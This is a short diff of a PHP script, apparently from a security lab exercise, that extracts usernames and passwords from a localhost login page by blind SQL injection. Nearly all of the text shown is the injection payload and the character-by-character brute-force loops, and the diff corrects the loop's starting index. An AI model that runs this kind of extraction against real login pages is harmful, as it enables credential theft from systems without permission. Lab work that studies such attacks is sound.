@@ -48,7 +48,7 @@ for($id = 1; $id <= 100; $id++){
 	//print $size;
 
 
-	for ($i = 0; $i <= $size; $i++) {
+	for ($i = 1; $i <= $size; $i++) {
 		foreach (range('a', 'z') as $letter){
          //echo "$letter \n";
 			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(username,$i,1)%20=%20%27$letter%27%20--%20";
@@ -88,7 +88,7 @@ for($id = 1; $id <= 100; $id++){
 //print $sizepwd;
 
 	$letter = "";
-	for ($i = 0; $i <= $sizepwd; $i++) {
+	for ($i = 1; $i <= $sizepwd; $i++) {
 		foreach (range(33,127) as $character){
 			$letter = chr($character);
 			//$letter = mb_convert_encoding (chr($character), 'UTF-8', 'ISO-8859-1');
